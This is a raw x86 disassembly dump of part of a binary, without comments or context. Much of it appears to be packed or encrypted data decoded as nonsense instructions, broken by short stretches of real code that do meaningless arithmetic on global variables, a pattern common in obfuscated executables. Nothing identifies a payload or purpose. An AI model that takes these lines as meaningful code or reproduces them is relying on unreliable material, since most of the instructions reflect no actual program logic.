  4061d8:	test   DWORD PTR [edi+0x42],esp
  4061db:	jle    0x406224
  4061dd:	cmp    eax,0x894a97ce
  4061e2:	frstor [eax]
  4061e4:	sbb    DWORD PTR [edi-0x7691abfd],ebx
  4061ea:	scas   al,BYTE PTR es:[edi]
  4061eb:	dec    edx
  4061ec:	cdq    
  4061ed:	inc    eax
  4061ee:	mov    ebp,ss
  4061f0:	jle    0x406234
  4061f2:	je     0x40626d
  4061f4:	rcr    BYTE PTR [ecx+0x49331bd3],0x2c
  4061fb:	cmc    
  4061fc:	and    eax,0xab06b7ed
  406201:	into   
  406202:	jl     0x4061e3
  406204:	test   dl,bh
  406206:	es sti 
  406208:	lar    edx,WORD PTR [ebp+edi*4+0x7a5790f4]
  406210:	fstp   QWORD PTR [ebp+0x70]
  406213:	jmp    0x565287c9
  406218:	repnz cmc 
  40621a:	mov    dl,0x2c
  40621c:	lahf   
  40621d:	rol    BYTE PTR [eax],cl
  40621f:	xchg   edi,eax
  406220:	fnsave [eax]
  406222:	les    ebp,FWORD PTR [ecx-0x58508aef]
  406228:	ficomp WORD PTR [ecx-0x2722e15c]
  40622e:	test   BYTE PTR [edi],ch
  406230:	sub    DWORD PTR [ebp-0x2905ceae],esi
  406236:	and    eax,0x6dbeb9ea
  40623b:	adc    eax,0x6c717760
  406240:	fsubr  DWORD PTR [esi-0x7b6aafe4]
  406246:	test   BYTE PTR [esi-0x2b51185a],ah
  40624c:	mov    ah,0x99
  40624e:	(bad)  
  406250:	test   bh,ch
  406252:	cld    
  406253:	lods   eax,DWORD PTR ds:[esi]
  406254:	xor    eax,0xa6e2541f
  406259:	cmc    
  40625a:	cwde   
  40625b:	nop
  40625c:	pop    edi
  40625d:	out    dx,al
  40625e:	adc    edi,esp
  406260:	sar    ebx,0x46
  406263:	or     BYTE PTR [edx+0x69],0xbb
  406267:	mul    BYTE PTR [eax]
  406269:	mov    dl,0x1c
  40626b:	js     0x4062ba
  40626d:	arpl   WORD PTR ss:[esi-0x7f],bp
  406271:	ret    
  406272:	push   ecx
  406273:	and    BYTE PTR [edx+0x11f1b1bd],0x5c
  40627a:	sbb    bl,BYTE PTR [edx-0x6a7cd286]
  406280:	push   ebp
  406281:	inc    esi
  406282:	es or  al,0xf7
  406285:	imul   ecx,esp,0xffffffe7
  406288:	imul   esi,DWORD PTR [edi],0xffffff8a
  40628b:	adc    DWORD PTR [edx+0x18458bd2],0x8110758b
  406295:	sub    eax,0x42fd09
  40629a:	xchg   ch,bh
  40629c:	inc    edx
  40629d:	add    BYTE PTR [ecx+0xd090c46],cl
  4062a3:	repz out 0x42,al
  4062a6:	add    BYTE PTR [ebx+0x5c71c45],cl
  4062ac:	jb     0x4062ab
  4062ae:	inc    edx
  4062af:	add    BYTE PTR [esi],bl
  4062b1:	add    BYTE PTR [eax],al
  4062b3:	add    BYTE PTR [ebx+0x42fd723d],al
  4062b9:	add    BYTE PTR [eax],al
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	mov    ah,0xf4
  406330:	loop   0x406380
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406360
  40633b:	(bad)  
  40633c:	(bad)  
  40633d:	retf   
  40633e:	sub    DWORD PTR [esi+esi*1],eax
  406341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406342:	fisttp WORD PTR [edi+0x6578d78]
  406348:	addr16 dec edi
  40634a:	adc    al,dl
  40634c:	xor    al,bh
  40634e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40634f:	stos   BYTE PTR es:[edi],al
  406350:	jns    0x40630c
  406352:	or     eax,0x91865b56
  406357:	mov    ecx,0xc5d3e3e9
  40635c:	sahf   
  40635d:	jnp    0x4063cd
  40635f:	jo     0x406380
  406361:	ins    BYTE PTR es:[edi],dx
  406362:	mov    ds:0x5d8dd077,al
  406367:	pusha  
  406368:	iret   
  406369:	or     eax,0x7d6dcff
  40636e:	lock mov al,0x27
  406371:	std    
  406372:	push   ss
  406373:	mov    ch,0xb2
  406375:	jnp    0x40632b
  406377:	jp     0x406342
  406379:	jb     0x406306
  40637b:	aas    
  40637c:	jle    0x4063b1
  40637e:	mov    edx,0x2356224f
  406383:	push   esp
  406384:	aas    
  406385:	mov    ds:0x94551fdc,eax
  40638a:	push   0xffffffa1
  40638c:	sbb    al,0x3c
  40638e:	lahf   
  40638f:	out    0x35,eax
  406391:	mov    dl,cl
  406393:	dec    edi
  406394:	pop    ds
  406395:	das    
  406396:	or     DWORD PTR [ebx-0x9],edx
  406399:	je     0x4063ea
  40639b:	shl    DWORD PTR [edx+edx*1],0xc1
  40639f:	aas    
  4063a0:	shl    BYTE PTR [ebp+0x4a303ef0],cl
  4063a6:	das    
  4063a7:	outs   dx,BYTE PTR ds:[esi]
  4063a8:	jp     0x406428
  4063aa:	sub    al,0xde
  4063ac:	in     al,0x9d
  4063ae:	(bad)  
  4063af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063b0:	std    
  4063b1:	add    esp,ecx
  4063b3:	(bad)  
  4063b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063b5:	icebp  
  4063b6:	(bad)  
  4063b7:	pop    ss
  4063b8:	in     eax,0xdf
  4063ba:	jne    0x4063b3
  4063bc:	ds or  esi,esi
  4063bf:	ss xchg esp,eax
  4063c1:	test   DWORD PTR [edi-0x7d],esi
  4063c4:	scas   eax,DWORD PTR es:[edi]
  4063c5:	sub    eax,0x171874ea
  4063ca:	add    eax,0x8100677e
  4063cf:	sbb    eax,0x14ebc542
  4063d4:	out    dx,al
  4063d5:	sbb    ebx,DWORD PTR [esi+0x46]
  4063d8:	fmul   QWORD PTR [edx+0x4453a4f6]
  4063de:	mov    BYTE PTR [ebx-0x5378981],al
  4063e4:	sub    BYTE PTR [eax+eiz*2],dh
  4063e7:	jnp    0x406419
  4063e9:	xor    BYTE PTR [edi],ch
  4063eb:	je     0x406427
  4063ed:	pop    es
  4063ee:	fcmovnbe st,st(4)
  4063f0:	xor    al,0x2d
  4063f2:	int3   
  4063f3:	and    eax,0x425b6740
  4063f8:	stos   BYTE PTR es:[edi],al
  4063f9:	mov    esi,0x69eaf183
  4063fe:	sti    
  4063ff:	adc    al,0xd
  406401:	inc    ecx
  406402:	or     DWORD PTR [ebx],0xf3cebc25
  406408:	icebp  
  406409:	mov    ebp,0x1682de47
  40640e:	lock push esp
  406410:	or     eax,0x7ab06117
  406415:	inc    ebp
  406417:	cdq    
  406418:	mov    ah,0xdd
  40641a:	out    0x39,eax
  40641c:	inc    ecx
  40641d:	push   eax
  40641e:	sub    al,0x99
  406420:	lea    esi,[ecx]
  406422:	in     eax,0x8c
  406424:	pop    DWORD PTR [esp+ecx*2+0x65]
  406428:	popf   
  406429:	fidiv  WORD PTR [edi]
  40642b:	rol    BYTE PTR [edi],0x3d
  40642e:	jmp    0x7912:0xc379a5d1
  406435:	sub    ecx,esp
  406437:	je     0x40646f
  406439:	or     DWORD PTR [ebx-0x6],ebx
  40643c:	icebp  
  40643d:	and    BYTE PTR [edx+0x5aaaff1f],bh
  406443:	ret    0xb037
  406446:	mov    ecx,0x2748cbd2
  40644b:	adc    al,0x2e
  40644d:	rcl    DWORD PTR [edx-0x79ba2e5a],cl
  406453:	or     eax,0x338f334
  406458:	(bad)  [edi+0x30]
  40645b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40645c:	popf   
  40645d:	pop    edx
  40645e:	xchg   ecx,eax
  40645f:	sbb    al,0x95
  406461:	leave  
  406462:	ja     0x40645f
  406464:	mov    esi,?
  406466:	vpsadbw ymm3,ymm7,YMMWORD PTR [ebx+esi*4]
  40646b:	sahf   
  40646c:	shr    DWORD PTR [edi],1
  40646e:	pop    ss
  40646f:	lods   al,BYTE PTR ds:[esi]
  406470:	imul   ebp,DWORD PTR [edi],0x8c00df4e
  406476:	repnz and BYTE PTR [ebx],cl
  406479:	or     DWORD PTR [ecx],ecx
  40647b:	jl     0x406481
  40647d:	into   
  40647e:	imul   ebp,DWORD PTR [ebx+0x14],0x6b00b21a
  406485:	mov    edx,0xbae5f9d3
  40648a:	popa   
  40648b:	sub    eax,0xb8f7d3fc
  406490:	xchg   ebp,eax
  406491:	nop
  406492:	dec    eax
  406493:	in     eax,dx
  406494:	test   BYTE PTR ds:0x7c58a142,0xd0
  40649b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40649c:	ss scas al,BYTE PTR es:[edi]
  40649e:	shl    ebp,0x4b
  4064a1:	scas   al,BYTE PTR es:[edi]
  4064a2:	or     BYTE PTR [ecx-0x1357d85],cl
  4064a8:	test   eax,0xb97f4266
  4064ad:	jb     0x40651d
  4064af:	mov    edx,0x2a8fa50
  4064b4:	ins    BYTE PTR es:[edi],dx
  4064b5:	jmp    0x4064ea
  4064b7:	popa   
  4064b8:	lods   eax,DWORD PTR ds:[esi]
  4064b9:	adc    ebp,esp
  4064bb:	jmp    0xc554e9eb
  4064c0:	into   
  4064c1:	leave  
  4064c2:	iret   
  4064c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c4:	test   BYTE PTR [edi+edi*4-0x6bb7a1c4],bh
  4064cb:	ret    0xdba2
  4064ce:	pop    esp
  4064cf:	or     al,0x6a
  4064d1:	ds sti 
  4064d3:	push   esp
  4064d4:	mov    dl,0xf2
  4064d6:	xor    DWORD PTR [ebx],esi
  4064d8:	dec    ebx
  4064d9:	pusha  
  4064da:	push   ebx
  4064db:	fbld   TBYTE PTR [ecx-0x664914c9]
  4064e1:	in     al,dx
  4064e2:	sbb    BYTE PTR [esi-0x37],bl
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	int3   
  406567:	xchg   edx,eax
  406568:	pushf  
  406569:	push   eax
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	sbb    eax,0x37ed32c9
  406577:	(bad)  
  406578:	or     al,0xa0
  40657a:	pop    esi
  40657b:	nop
  40657c:	mov    bh,0xf8
  40657e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40657f:	test   BYTE PTR [eax-0x501876ca],0x70
  406586:	mov    esp,0x49b33380
  40658b:	adc    dl,ah
  40658d:	push   ebx
  40658e:	push   eax
  40658f:	out    0x8e,eax
  406591:	es mov dl,dh
  406594:	icebp  
  406595:	sub    dh,BYTE PTR [eax-0x6]
  406598:	xchg   ecx,eax
  406599:	push   edi
  40659a:	mov    edi,0x38f6434a
  4065a0:	xchg   bh,al
  4065a2:	and    BYTE PTR [eax],ah
  4065a4:	into   
  4065a5:	into   
  4065a6:	int    0x93
  4065a8:	mov    esp,0xb947b256
  4065ad:	push   eax
  4065ae:	into   
  4065af:	dec    eax
  4065b0:	mov    ch,0x20
  4065b2:	in     eax,dx
  4065b3:	add    ah,BYTE PTR [ebp+0xf]
  4065b6:	xchg   ebp,eax
  4065b7:	push   esp
  4065b8:	push   ebx
  4065b9:	push   esi
  4065ba:	js     0x4065d4
  4065bc:	cld    
  4065bd:	push   cs
  4065be:	dec    eax
  4065bf:	data16 and bh,BYTE PTR [ebx-0x32c057c8]
  4065c6:	push   0xffffff9e
  4065c8:	sub    al,0xe8
  4065ca:	jno    0x4065ed
  4065cc:	xchg   edi,eax
  4065cd:	dec    edx
  4065ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065d0:	outs   dx,DWORD PTR ds:[esi]
  4065d1:	mov    edx,0xb1e4ca91
  4065d6:	inc    eax
  4065d7:	out    0xa8,eax
  4065d9:	adc    BYTE PTR [eax-0x3f],0xe7
  4065dd:	dec    ecx
  4065de:	dec    ebx
  4065df:	mov    ebx,0x5fc0d424
  4065e4:	cli    
  4065e5:	lock lods eax,DWORD PTR ds:[esi]
  4065e7:	dec    edx
  4065e8:	or     eax,0xf8cdecb8
  4065ed:	retf   0x96fc
  4065f0:	cmp    dh,cl
  4065f2:	push   eax
  4065f3:	icebp  
  4065f4:	mov    WORD PTR [esi-0x21ffa94],fs
  4065fa:	ret    
  4065fb:	sbb    bl,BYTE PTR [ebx]
  4065fd:	mov    ebp,0xe1f463da
  406602:	(bad)  
  406603:	or     edx,ebx
  406605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406606:	fdiv   DWORD PTR [esp+esi*4-0x80]
  40660a:	jo     0x4065a9
  40660c:	dec    edx
  40660d:	sub    BYTE PTR [esi+0x2aad4d06],0xaf
  406614:	sbb    ch,BYTE PTR [ecx]
  406616:	sbb    DWORD PTR [edi-0x1f361ebd],0x59
  40661d:	push   edx
  40661e:	push   ss
  40661f:	ror    DWORD PTR [ebx],1
  406621:	inc    edx
  406622:	js     0x406624
  406624:	and    BYTE PTR [ecx-0x30],bl
  406627:	pop    ebx
  406628:	outs   dx,BYTE PTR ds:[esi]
  406629:	mov    dh,0x8f
  40662b:	dec    ecx
  40662c:	xchg   ebp,eax
  40662d:	dec    esi
  40662e:	xlat   BYTE PTR ds:[ebx]
  40662f:	mov    al,ds:0x965e5684
  406634:	pop    ss
  406635:	and    DWORD PTR [edx],ebp
  406637:	aaa    
  406638:	or     BYTE PTR [ecx],bl
  40663a:	and    al,0xdd
  40663c:	idiv   BYTE PTR [esi+esi*2]
  40663f:	sub    DWORD PTR [esi],ebx
  406641:	cmp    al,0x2f
  406643:	clc    
  406644:	pop    esp
  406645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406646:	(bad)  
  406648:	jb     0x406697
  40664a:	sbb    eax,0x1f583a88
  40664f:	and    edi,DWORD PTR [ebp-0x50776318]
  406655:	loope  0x4065f5
  406657:	lods   al,BYTE PTR ds:[esi]
  406658:	in     eax,dx
  406659:	add    DWORD PTR [ebx],ebp
  40665b:	jmp    0x71e31741
  406660:	lock inc ebp
  406662:	sbb    BYTE PTR [edx],ch
  406664:	mov    ah,0x19
  406666:	mov    cl,0xdb
  406668:	inc    edi
  406669:	or     dh,BYTE PTR [eax+0x54]
  40666c:	mov    ds,WORD PTR ds:0xf4954c7b
  406672:	and    ch,BYTE PTR [edi-0x34945ec4]
  406678:	mov    es,WORD PTR [ecx-0x67c74932]
  40667e:	inc    edi
  40667f:	jo     0x4066bc
  406681:	adc    cl,BYTE PTR ds:0xb87fb4a
  406687:	lods   al,BYTE PTR ds:[esi]
  406688:	scas   eax,DWORD PTR es:[edi]
  406689:	inc    edx
  40668a:	lock ret 0xb612
  40668e:	and    al,0x2e
  406690:	aaa    
  406691:	add    BYTE PTR [esi+0x354662fb],bh
  406697:	xor    edi,eax
  406699:	lock aad 0x90
  40669c:	rcr    DWORD PTR [edi-0x2a5e60e5],1
  4066a2:	sub    eax,0xf07e07bb
  4066a7:	xor    ebx,DWORD PTR [ebx-0x9]
  4066aa:	fwait
  4066ab:	sbb    al,dh
  4066ad:	sti    
  4066ae:	add    edx,DWORD PTR [edi]
  4066b0:	ror    BYTE PTR [eax],cl
  4066b2:	ja     0x40669d
  4066b4:	aam    0x1e
  4066b6:	ins    DWORD PTR es:[edi],dx
  4066b7:	mov    esi,DWORD PTR [esi]
  4066b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066ba:	xor    ecx,edx
  4066bc:	xchg   edx,eax
  4066bd:	add    al,0xbf
  4066bf:	imul   edi
  4066c1:	rol    DWORD PTR [ebp+edi*8+0x35],cl
  4066c5:	in     al,dx
  4066c6:	data16 lods al,BYTE PTR ds:[esi]
  4066c8:	jo     0x406673
  4066ca:	cmp    eax,0x3f8c334a
  4066cf:	test   al,0x20
  4066d1:	popf   
  4066d2:	jne    0x406705
  4066d4:	xchg   esi,eax
  4066d5:	cmp    DWORD PTR [esi+0x4e],ebx
  4066d8:	mov    cl,0x90
  4066da:	sbb    DWORD PTR [ecx],esi
  4066dc:	and    al,0xa0
  4066de:	add    eax,0x8a5e7a24
  4066e3:	inc    esp
  4066e4:	cmp    BYTE PTR [eax],ah
  4066e6:	pop    ss
  4066e7:	adc    DWORD PTR [ebx-0x1],ebp
  4066ea:	add    DWORD PTR [ecx],esp
  4066ec:	or     bh,ch
  4066ee:	or     DWORD PTR [esi-0xf27000d],0x32
  4066f5:	test   eax,0x3ee3723c
  4066fa:	fisubr WORD PTR [ecx-0x39]
  4066fd:	in     eax,0x66
  4066ff:	iret   
  406700:	adc    DWORD PTR [ebp-0x8],0x80accf78
  406707:	mov    ds:0xb2a44546,eax
  40670c:	fisttp DWORD PTR [eax-0x17]
  40670f:	repnz cmp eax,0x23b60c13
  406715:	out    dx,eax
  406716:	mov    ebx,0x38f57b43
  40671b:	push   esi
  40671c:	out    dx,al
  40671d:	shr    BYTE PTR [esi],cl
  40671f:	out    dx,al
  406720:	push   0xfffffffb
  406722:	fld    QWORD PTR [ebx]
  406724:	popa   
  406725:	repnz data16 sbb al,0x89
  406729:	dec    DWORD PTR [esi]
  40672b:	pop    esi
  40672c:	(bad)  
  40672d:	icebp  
  40672e:	iret   
  40672f:	imul   DWORD PTR [ebx-0x17]
  406732:	fnstenv [eax+0x14]
  406735:	les    ebx,FWORD PTR [edx]
  406737:	fld1   
  406739:	sti    
  40673a:	retf   0x1095
  40673d:	jge    0x4067be
  40673f:	mov    ds:0x78059ef9,eax
  406744:	cdq    
  406745:	xchg   ecx,eax
  406746:	xchg   ebp,edi
  406748:	loope  0x4066fb
  40674a:	pop    ebx
  40674b:	or     DWORD PTR [esi-0x6204fcb1],eax
  406751:	stos   DWORD PTR es:[edi],eax
  406752:	push   cs
  406753:	imul   ebp,DWORD PTR [ebx],0x3a
  406756:	push   0x7c216b0b
  40675b:	sbb    bh,cl
  40675d:	dec    edx
  40675e:	and    BYTE PTR [edi],cl
  406760:	fcomp  QWORD PTR [ebx+0x3f]
  406763:	xchg   DWORD PTR [esi+0x4a1428bd],esi
  406769:	jecxz  0x4067dd
  40676b:	jb     0x40679c
  40676d:	jnp    0x406719
  40676f:	ins    DWORD PTR es:[edi],dx
  406770:	or     dh,BYTE PTR [eax]
  406772:	mov    ds:0xca5d6e79,al
  406777:	popa   
  406778:	xchg   ebx,eax
  406779:	dec    eax
  40677a:	mov    eax,ds:0x65a1eb72
  40677f:	push   cs
  406780:	popa   
  406781:	push   es
  406782:	retf   
  406783:	std    
  406784:	jb     0x40670c
  406786:	int    0x17
  406788:	xor    DWORD PTR ds:0x36015186,edx
  40678e:	sahf   
  40678f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406790:	push   edx
  406791:	pop    esi
  406792:	in     al,0xd0
  406794:	xchg   ebp,edi
  406796:	mov    DWORD PTR [ebx],ebx
  406798:	or     eax,0x99e93b6b
  40679d:	or     eax,0x4a9fb5bd
  4067a2:	repz cwde 
  4067a4:	push   ebx
  4067a5:	pop    esi
  4067a6:	lock push ebx
  4067a8:	jle    0x406762
  4067aa:	or     al,0xaa
  4067ac:	test   ah,dl
  4067ae:	shl    DWORD PTR [ecx],cl
  4067b0:	dec    ecx
  4067b1:	xchg   bp,ax
  4067b3:	fcomp  QWORD PTR [ecx+0x71]
  4067b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067b7:	mov    eax,0x320f638
  4067bc:	add    ch,BYTE PTR [ebx-0x6f]
  4067bf:	(bad)  
  4067c0:	outs   dx,BYTE PTR ds:[esi]
  4067c1:	popf   
  4067c2:	popf   
  4067c3:	call   0x992a:0xfb5745a2
  4067ca:	sbb    bl,dh
  4067cc:	jle    0x406812
  4067ce:	sub    DWORD PTR [edi-0x5a],ecx
  4067d1:	inc    esi
  4067d2:	mov    cl,0xac
  4067d4:	out    0xba,al
  4067d6:	fsubr  QWORD PTR [eax-0x63]
  4067d9:	adc    esp,DWORD PTR [ebx-0x43]
  4067dc:	lea    edi,[edx+0x558bd0be]
  4067e2:	adc    BYTE PTR [ecx-0x3dccf7be],cl
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	test   DWORD PTR [eax+0x38a55321],edi
  40684c:	jo     0x4068be
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406853:	sbb    BYTE PTR [edi+edx*4],cl
  406856:	int3   
  406857:	push   cs
  406858:	test   al,0x21
  40685a:	and    al,0xdc
  40685c:	call   0xea45:0xe3aee3cb
  406863:	mov    ds:0x430f9575,eax
  406868:	fistp  DWORD PTR [eax-0x78]
  40686b:	call   0xcf96622f
  406870:	cdq    
  406871:	mov    dh,0x9
  406873:	or     BYTE PTR [ecx],dl
  406875:	xor    edi,ebx
  406877:	enter  0x352f,0xdd
  40687b:	inc    esp
  40687c:	ss loope 0x4068d7
  40687f:	mov    esi,0xc5cd7cba
  406884:	inc    edx
  406885:	iret   
  406886:	shr    BYTE PTR [ebx-0x4e4989fd],0xdb
  40688d:	das    
  40688e:	les    ebx,FWORD PTR [ecx+edi*2]
  406891:	push   DWORD PTR fs:0x57e45c6d
  406898:	std    
  406899:	fwait
  40689a:	mov    ch,0x61
  40689c:	leave  
  40689d:	mov    ah,0x33
  40689f:	jp     0x40685d
  4068a1:	int3   
  4068a2:	stos   BYTE PTR es:[edi],al
  4068a3:	stc    
  4068a4:	cmp    BYTE PTR [edi+0x2b287564],dh
  4068aa:	cmp    al,0xf3
  4068ac:	stc    
  4068ad:	data16 lods al,BYTE PTR ds:[esi]
  4068af:	xchg   esp,eax
  4068b0:	mov    ds:0x8c2cc58d,eax
  4068b5:	add    eax,0x25dd09d7
  4068ba:	xor    BYTE PTR [edx-0x40d42400],al
  4068c0:	adc    ecx,DWORD PTR [ebx-0x79064c01]
  4068c6:	and    DWORD PTR ss:[edi+0x1c],ecx
  4068ca:	pusha  
  4068cb:	outs   dx,BYTE PTR ds:[esi]
  4068cc:	mov    dl,0x93
  4068ce:	sbb    ebp,DWORD PTR [edx-0x63b65690]
  4068d4:	push   eax
  4068d5:	loop   0x4068ad
  4068d7:	mov    DWORD PTR [edx-0x68],edx
  4068da:	repz inc ebp
  4068dc:	(bad)
  4068df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e0:	push   cs
  4068e1:	leave  
  4068e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068e3:	mov    ecx,0xd25d8622
  4068e8:	retf   
  4068e9:	lahf   
  4068ea:	movq   QWORD PTR [eax-0x2fafddf8],mm6
  4068f1:	inc    ecx
  4068f2:	cwde   
  4068f3:	sbb    al,0x66
  4068f6:	xchg   edi,eax
  4068f7:	bound  eax,QWORD PTR [edx+esi*8+0x5084e8e6]
  4068fe:	push   eax
  4068ff:	scas   al,BYTE PTR es:[edi]
  406900:	std    
  406901:	pop    edi
  406902:	sub    DWORD PTR [ecx-0x45],ebx
  406905:	pushf  
  406906:	int3   
  406907:	mov    ecx,0x937f4a96
  40690c:	mov    ch,0x7b
  40690e:	adc    eax,0x22ee3cce
  406913:	push   0xfa92b9fb
  406918:	rcl    DWORD PTR gs:[ecx+0x24d6d03],0x30
  406920:	add    BYTE PTR [ebp-0x6a],dl
  406923:	sahf   
  406924:	adc    eax,0x2fcac863
  406929:	and    al,0xc4
  40692b:	aas    
  40692c:	and    DWORD PTR [ebp-0x4f792eb3],esi
  406932:	test   cl,al
  406934:	add    ah,BYTE PTR [ebp+0x3a]
  406937:	aas    
  406938:	mov    ds:0xa66ec648,al
  40693d:	cs cmp eax,0x1999bc1f
  406943:	rcr    BYTE PTR [edx+0x17],1
  406946:	ss pop ds
  406948:	icebp  
  406949:	xchg   edi,eax
  40694a:	fdiv   st(0),st
  40694c:	sub    al,0x5b
  40694e:	inc    ebp
  40694f:	cmp    edi,DWORD PTR [edi]
  406951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406952:	and    eax,DWORD PTR [edi+0x1f]
  406955:	cmp    al,0x66
  406957:	push   esi
  406958:	pop    ds
  406959:	or     DWORD PTR [eax-0x45fed176],0xffffff91
  406960:	cli    
  406961:	loope  0x406952
  406963:	pop    ds
  406964:	and    ebp,ebx
  406966:	(bad)  
  406968:	out    dx,al
  406969:	fsubr  DWORD PTR [eax]
  40696b:	adc    DWORD PTR ds:0x7cbb4b11,esi
  406971:	out    dx,eax
  406972:	sti    
  406973:	mov    dh,0x48
  406975:	xchg   BYTE PTR [edi],bh
  406977:	adc    al,0x1e
  406979:	test   al,0xf
  40697b:	jns    0x4069e6
  40697d:	push   esp
  40697e:	add    al,BYTE PTR [edx]
  406980:	sahf   
  406981:	pop    ss
  406982:	mov    DWORD PTR [ebp*8-0xc017c5c],ecx
  406989:	or     ch,ah
  40698b:	dec    esi
  40698c:	nop
  40698d:	mov    ch,0x7
  40698f:	xor    dh,BYTE PTR [edi+0x2c8b5e2c]
  406995:	ret    
  406996:	das    
  406997:	test   al,0x6c
  406999:	sub    eax,0x8e505a64
  40699e:	mov    ecx,DWORD PTR [edx-0x40329c25]
  4069a4:	rcl    eax,0xd0
  4069a7:	cmp    BYTE PTR [eax+0x73],dl
  4069aa:	stos   BYTE PTR es:[edi],al
  4069ab:	std    
  4069ac:	add    al,0xc2
  4069ae:	ss mov edi,0x6ad5db36
  4069b4:	jnp    0x406988
  4069b6:	test   bl,cl
  4069b8:	xchg   DWORD PTR [eax],ecx
  4069ba:	push   edx
  4069bb:	idiv   DWORD PTR [eax+0xeede96c]
  4069c1:	xor    al,0xc
  4069c3:	xchg   ebx,eax
  4069c4:	(bad)  
  4069c5:	mov    ebp,0x3655a426
  4069ca:	aam    0x44
  4069cc:	jb     0x406963
  4069ce:	inc    sp
  4069d0:	xor    esp,edi
  4069d2:	mov    WORD PTR [esi],ds
  4069d4:	nop
  4069d5:	out    dx,eax
  4069d6:	inc    eax
  4069d7:	pop    ebp
  4069d8:	pop    eax
  4069d9:	outs   dx,DWORD PTR ds:[esi]
  4069da:	sub    esp,DWORD PTR [ebp-0x6586ffe9]
